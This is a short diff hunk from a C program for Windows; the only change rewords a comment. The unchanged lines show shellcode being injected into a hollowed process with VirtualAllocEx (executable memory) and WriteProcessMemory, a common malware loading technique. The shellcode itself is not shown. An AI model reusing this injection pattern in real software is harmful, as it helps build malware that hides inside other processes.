@@ -23,7 +23,7 @@ int _tmain(int argc, _TCHAR* argv[])
     {
         // We calculate the size of the shellcode
         dwImageSize = sizeof(shellcode);
-        // Now that we know the size of the shellcode, we can allocate the right amount of memory.
+        // Now that we know the size of the shellcode, we can allocate memory in our process.
         pImageBase = VirtualAllocEx(pi.hProcess, NULL, dwImageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
         // We write the shellcode to the hollowed process memory.
         bSuccess = WriteProcessMemory(pi.hProcess, pImageBase, shellcode, dwImageSize, &dwBytesWritten);
